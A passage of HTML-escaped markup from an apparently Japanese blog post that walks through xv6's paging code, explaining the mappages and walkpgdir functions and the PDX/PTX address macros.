    href=&quot;/static/cea566737a194af6446f300861a595e8/41099/zu03b.jpg&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 40.416666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAIABQDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAX/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAABtiAP/8QAFxAAAwEAAAAAAAAAAAAAAAAAAAEQEf/aAAgBAQABBQJzD//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8BP//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8BP//EABYQAAMAAAAAAAAAAAAAAAAAAAAQMf/aAAgBAQAGPwJU/8QAGRAAAgMBAAAAAAAAAAAAAAAAAAERMUFx/9oACAEBAAE/IWkvWdD/2gAMAwEAAgADAAAAEIvv/8QAFREBAQAAAAAAAAAAAAAAAAAAABH/2gAIAQMBAT8Qqv/EABURAQEAAAAAAAAAAAAAAAAAAAAR/9oACAECAQE/EIj/xAAaEAEAAgMBAAAAAAAAAAAAAAABABExUXGR/9oACAEBAAE/EEWU4wKHtcHtn//Z&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/cea566737a194af6446f300861a595e8/8ac56/zu03b.webp 240w,
/static/cea566737a194af6446f300861a595e8/d3be9/zu03b.webp 480w,
/static/cea566737a194af6446f300861a595e8/b0a15/zu03b.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/cea566737a194af6446f300861a595e8/09b79/zu03b.jpg 240w,
/static/cea566737a194af6446f300861a595e8/7cc5e/zu03b.jpg 480w,
/static/cea566737a194af6446f300861a595e8/41099/zu03b.jpg 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/jpeg&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/cea566737a194af6446f300861a595e8/41099/zu03b.jpg&quot;
            alt=&quot;img&quot;
            title=&quot;img&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;https://xtech.nikkei.com/it/article/COLUMN/20071107/286632/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;第6回 メモリー上のデータを見えなくする（前編） | 日経クロステック（xTECH）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;http://softwaretechnique.web.fc2.com/OS_Development/kernel_development07.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;０から作るOS開発　ページングその１　ページとPTEとPDE&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;まずはソースコードを見てみます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Create PTEs for virtual addresses starting at va that refer to&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// physical addresses starting at pa. va and size might not&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// be page-aligned.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mappages&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;pde_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;va&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; uint size&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; uint pa&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; perm&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;last&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token class-name&quot;&gt;pte_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pte&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  a &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;PGROUNDDOWN&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;va&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  last &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;PGROUNDDOWN&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;va&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pte &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;walkpgdir&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; a&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pte &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; PTE_P&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;remap&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pte &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; pa &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; perm &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; PTE_P&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; last&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    a &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; PGSIZE&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    pa &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; PGSIZE&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mappages&lt;/code&gt;は以下の5つの引数を受け取ります。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;*pgdir：確保したページ(PDT)&lt;/li&gt;
&lt;li&gt;*va：PTEを作成する仮想アドレス&lt;/li&gt;
&lt;li&gt;size：紐づける物理アドレス領域のサイズ&lt;/li&gt;
&lt;li&gt;pa：紐づける物理アドレスの先頭アドレス&lt;/li&gt;
&lt;li&gt;perm：割り当てる権限&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;まず、PTEを作成する仮想アドレスと紐づける物理アドレス領域のサイズをもとにしてページサイズでアラインメントされたアドレスが&lt;code class=&quot;language-text&quot;&gt;a&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;last&lt;/code&gt;に格納されます。&lt;/p&gt;
&lt;p&gt;アラインメントに使用する&lt;code class=&quot;language-text&quot;&gt;PGROUNDDOWN&lt;/code&gt;については過去の記事で解説済みのため割愛します。&lt;/p&gt;
&lt;p&gt;次のループはこの&lt;code class=&quot;language-text&quot;&gt;a&lt;/code&gt;が&lt;code class=&quot;language-text&quot;&gt;last&lt;/code&gt;と一致するまでページサイズを加算しつつ実行されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pte &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;walkpgdir&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; a&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pte &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; PTE_P&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;remap&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pte &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; pa &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; perm &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; PTE_P&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; last&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  a &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; PGSIZE&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  pa &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; PGSIZE&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;実際にPTEの領域を確保しているのは&lt;code class=&quot;language-text&quot;&gt;walkpgdir&lt;/code&gt;関数です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;walkpgdir&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;vm.c&lt;/code&gt;で定義された関数です。&lt;/p&gt;
&lt;p&gt;引数として受け取ったページテーブル&lt;code class=&quot;language-text&quot;&gt;pgdir&lt;/code&gt;のPTEのアドレスを返します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Return the address of the PTE in page table pgdir&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// that corresponds to virtual address va.  If alloc!=0,&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// create any required page table pages.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;pte_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; 
&lt;span class=&quot;token function&quot;&gt;walkpgdir&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;pde_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;va&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; alloc&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token class-name&quot;&gt;pde_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pde&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token class-name&quot;&gt;pte_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pgtab&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  pde &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;PDX&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;va&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pde &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; PTE_P&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    pgtab &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;pte_t&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;PTE_ADDR&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pde&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;alloc &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgtab &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;pte_t&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;kalloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// Make sure all those PTE_P bits are zero.&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgtab&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PGSIZE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// The permissions here are overly generous, but they can&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// be further restricted by the permissions in the page table&lt;/span&gt;
    &lt;span class=&quot;token comment&quot;&gt;// entries, if necessary.&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pde &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;V2P&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgtab&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; PTE_P &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; PTE_W &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; PTE_U&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;pgtab&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;PTX&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;va&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;まず、&lt;code class=&quot;language-text&quot;&gt;pde = &amp;amp;pgdir[PDX(va)];&lt;/code&gt;の行ではPDTとして確保しているページのうち、PTEを格納するインデックスを解決しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;PDX(va)&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;mmu.h&lt;/code&gt;で定義されているマクロで、仮想アドレスから&lt;code class=&quot;language-text&quot;&gt;page directory index&lt;/code&gt;を解決しています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// A virtual address &apos;la&apos; has a three-part structure as follows:&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;//&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// +--------10------+-------10-------+---------12----------+&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// | Page Directory |   Page Table   | Offset within Page  |&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// |      Index     |      Index     |                     |&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// +----------------+----------------+---------------------+&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;//  \--- PDX(va) --/ \--- PTX(va) --/&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// page directory index&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name function&quot;&gt;PDX&lt;/span&gt;&lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;va&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;         &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;va&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; PDXSHIFT&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3FF&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// page table index&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name function&quot;&gt;PTX&lt;/span&gt;&lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;va&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;         &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;va&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; PTXSHIFT&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3FF&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;PTXSHIFT&lt;/span&gt;        &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;      &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// offset of PTX in a linear address&lt;/span&gt;&lt;/span&gt;
